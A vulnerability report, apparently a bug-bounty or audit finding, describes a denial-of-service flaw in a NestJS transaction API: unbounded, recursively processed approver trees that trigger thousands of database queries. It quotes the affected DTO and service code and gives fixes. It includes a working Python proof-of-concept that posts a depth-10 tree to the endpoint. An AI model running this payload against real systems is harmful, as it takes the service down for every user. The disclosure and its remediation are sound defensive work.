### Title
Unbounded Recursive Approver Tree Causes Denial-of-Service via Exhaustive Database Operations

### Summary
The `POST /transactions/:id/approvers` endpoint accepts a deeply nested `approversArray` with no maximum size or depth constraint. The `createTransactionApprovers` service method recursively processes each node in the tree, issuing 4–5 database queries per node. Any authenticated user who is the creator of a transaction can submit an arbitrarily large or deeply nested approver tree, exhausting the database connection pool and crashing the API service.

### Finding Description

**Root cause — missing `@ArrayMaxSize` on the DTO:**

`CreateTransactionApproverDto` enforces `@ArrayMinSize(1)` on the nested `approvers` field but has no upper-bound constraint. `CreateTransactionApproversArrayDto` has no size constraint on `approversArray` at all. [1](#0-0) 

`ArrayMaxSize` is confirmed absent across the entire codebase — `grep_search` for `ArrayMaxSize` returns zero matches.

**Exploit path — unbounded recursion in `createTransactionApprovers`:**

The inner `createApprover` closure is called recursively for every node in the submitted tree. For each node it issues:

1. `isNode(...)` — a DB query to check for duplicates
2. `transactionalEntityManager.findOne(TransactionApprover, ...)` — parent lookup
3. `getRootNodeFromNode(...)` — a recursive CTE query traversing the full ancestor chain
4. `transactionalEntityManager.count(User, ...)` — user existence check
5. `transactionalEntityManager.insert(TransactionApprover, ...)` — row insert [2](#0-1) 

With a tree of branching factor B and depth D, this produces O(B^D) recursive JavaScript calls and O(5 × B^D) synchronous database round-trips inside a single database transaction. A payload with depth 10 and branching factor 2 yields 1 024 recursive calls and ~5 120 DB queries per HTTP request.

**Entry point — authenticated normal user:**

The endpoint is guarded only by JWT authentication and a check that the caller is the transaction creator. [3](#0-2) 

No admin or privileged role is required. Any registered user who has created at least one transaction can trigger this path.

### Impact Explanation

- **Database connection exhaustion**: Each request holds a long-lived transaction while issuing thousands of sequential queries. A small number of concurrent crafted requests saturates the PostgreSQL connection pool, making the API unresponsive for all users.
- **API process crash**: Sufficiently deep nesting (e.g., depth ≥ ~10 000 with branching factor 1) overflows the JavaScript call stack inside the async recursive closure, crashing the NestJS worker.
- **Persistent state corruption risk**: Because all inserts happen inside a single DB transaction, a mid-flight crash leaves the transaction in an inconsistent state that must be manually cleaned up.

Severity: **High** — complete service unavailability achievable by a single authenticated user with no privileged access.

### Likelihood Explanation

- Precondition: valid JWT + at least one created transaction. Both are trivially obtainable by any registered user.
- The API accepts arbitrary JSON depth; NestJS's `class-validator` with `@ValidateNested({ each: true })` recursively validates the tree but imposes no depth or count limit.
- A single HTTP request with a crafted payload is sufficient; no timing, race condition, or repeated calls are needed.

### Recommendation

1. Add `@ArrayMaxSize(N)` (e.g., N = 20) to both `approvers` in `CreateTransactionApproverDto` and `approversArray` in `CreateTransactionApproversArrayDto`. [4](#0-3) 

2. Enforce a maximum nesting depth (e.g., 5) inside `createTransactionApprovers` by passing a `depth` counter through the recursive `createApprover` closure and throwing `BadRequestException` when exceeded. [5](#0-4) 

3. Apply the same `@ArrayMaxSize` guard to `CreateTransactionObserversDto.userIds` and `CreateTransactionGroupDto.groupItems` for defence-in-depth. [6](#0-5) [7](#0-6) 

### Proof of Concept

**Attacker preconditions**: registered account, valid JWT, one created transaction with `id = 1`.

**Crafted payload** (branching factor 2, depth 10 — 1 023 nodes, ~5 000 DB queries):

```python
import json, requests

def build_tree(depth):
    if depth == 0:
        return {"userId": 1}
    return {
        "threshold": 1,
        "approvers": [build_tree(depth - 1), build_tree(depth - 1)]
    }

payload = {"approversArray": [build_tree(10)]}

requests.post(
    "https://<api-host>/transactions/1/approvers",
    json=payload,
    headers={"Authorization": "Bearer <valid_jwt>"}
)
```

**Expected outcome**: The API worker stalls for several seconds (or crashes) while processing ~5 000 sequential DB queries inside a single transaction. Concurrent identical requests exhaust the PostgreSQL connection pool, returning 503/timeout errors to all other users until the pool recovers.

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction-approver.dto.ts (L1-30)
```typescript
import { IsArray, IsNumber, IsOptional, ValidateNested, ArrayMinSize } from 'class-validator';
import { Type } from 'class-transformer';

export class CreateTransactionApproverDto {
  @IsNumber()
  @IsOptional()
  listId?: number;

  @IsNumber()
  @IsOptional()
  threshold?: number;

  @IsNumber()
  @IsOptional()
  userId?: number;

  @IsArray()
  @ArrayMinSize(1)
  @IsOptional()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approvers?: CreateTransactionApproverDto[];
}

export class CreateTransactionApproversArrayDto {
  @IsArray()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionApproverDto)
  approversArray: CreateTransactionApproverDto[];
}
```

**File:** back-end/apps/api/src/transactions/approvers/approvers.service.ts (L234-356)
```typescript
  async createTransactionApprovers(
    user: User,
    transactionId: number,
    dto: CreateTransactionApproversArrayDto,
  ): Promise<TransactionApprover[]> {
    await this.getCreatorsTransaction(transactionId, user);

    const approvers: TransactionApprover[] = [];

    try {
      await this.dataSource.transaction(async transactionalEntityManager => {
        const createApprover = async (dtoApprover: CreateTransactionApproverDto) => {
          /* Validate Approver's DTO */
          this.validateApprover(dtoApprover);

          /* Check if the approver already exists */
          if (await this.isNode(dtoApprover, transactionId, transactionalEntityManager))
            throw new Error(this.APPROVER_ALREADY_EXISTS);

          /* Check if the parent approver exists and has threshold */
          if (typeof dtoApprover.listId === 'number') {
            const parent = await transactionalEntityManager.findOne(TransactionApprover, {
              where: { id: dtoApprover.listId },
            });

            if (!parent) throw new Error(this.PARENT_APPROVER_NOT_FOUND);

            /* Check if the root transaction is the same */
            const root = await this.getRootNodeFromNode(
              dtoApprover.listId,
              transactionalEntityManager,
            );
            if (root?.transactionId !== transactionId)
              throw new Error(this.ROOT_TRANSACTION_NOT_SAME);
          }

          /* Check if the user exists */
          if (typeof dtoApprover.userId === 'number') {
            const userCount = await transactionalEntityManager.count(User, {
              where: { id: dtoApprover.userId },
            });

            if (userCount === 0) throw new Error(this.USER_NOT_FOUND(dtoApprover.userId));
          }

          /* Check if there are sub approvers */
          if (
            typeof dtoApprover.userId === 'number' &&
            dtoApprover.approvers &&
            dtoApprover.approvers.length > 0
          )
            throw new Error(this.ONLY_USER_OR_TREE);

          /* Check if the approver has threshold when there are children */
          if (
            dtoApprover.approvers &&
            dtoApprover.approvers.length > 0 &&
            (dtoApprover.threshold === null || isNaN(dtoApprover.threshold))
          )
            throw new Error(this.THRESHOLD_REQUIRED);

          /* Check if the approver has children when there is threshold */
          if (
            typeof dtoApprover.threshold === 'number' &&
            (!dtoApprover.approvers || dtoApprover.approvers.length === 0)
          )
            throw new Error(this.CHILDREN_REQUIRED);

          /* Check if the approver threshold is less or equal to the number of approvers */
          if (
            dtoApprover.approvers &&
            (dtoApprover.threshold > dtoApprover.approvers.length || dtoApprover.threshold === 0)
          )
            throw new Error(this.THRESHOLD_LESS_OR_EQUAL_APPROVERS(dtoApprover.approvers.length));

          const data: DeepPartial<TransactionApprover> = {
            transactionId:
              dtoApprover.listId === null || isNaN(dtoApprover.listId) ? transactionId : null,
            listId: dtoApprover.listId,
            threshold:
              dtoApprover.threshold && dtoApprover.approvers ? dtoApprover.threshold : null,
            userId: dtoApprover.userId,
          };

          if (typeof dtoApprover.userId === 'number') {
            const userApproverRecords = await this.getApproversByTransactionId(
              transactionId,
              dtoApprover.userId,
              transactionalEntityManager,
            );

            if (userApproverRecords.length > 0) {
              data.signature = userApproverRecords[0].signature;
              data.userKeyId = userApproverRecords[0].userKeyId;
              data.approved = userApproverRecords[0].approved;
            }
          }

          /* Create approver */
          const approver = transactionalEntityManager.create(TransactionApprover, data);

          /* Insert approver */
          await transactionalEntityManager.insert(TransactionApprover, approver);
          approvers.push(approver);

          /* Continue creating the three */
          if (dtoApprover.approvers) {
            for (const nestedDtoApprover of dtoApprover.approvers) {
              const nestedApprover = { ...nestedDtoApprover, listId: approver.id };

              if (!nestedDtoApprover.approvers || nestedDtoApprover.approvers.length === 0) {
                nestedApprover.threshold = null;
              }

              await createApprover({ ...nestedDtoApprover, listId: approver.id });
            }
          }
        };

        for (const approver of dto.approversArray) {
          await createApprover(approver);
        }
      });
```

**File:** back-end/apps/api/src/transactions/dto/create-transaction-observers.dto.ts (L1-8)
```typescript
import { ArrayMinSize, IsArray, IsNumber } from 'class-validator';

export class CreateTransactionObserversDto {
  @IsArray()
  @IsNumber({}, { each: true })
  @ArrayMinSize(1)
  userIds: number[];
}
```

**File:** back-end/apps/api/src/transactions/dto/create-transaction-group.dto.ts (L24-29)
```typescript
  @IsArray()
  @IsNotEmpty()
  @ValidateNested({ each: true })
  @Type(() => CreateTransactionGroupItemDto)
  groupItems: CreateTransactionGroupItemDto[];
}
```
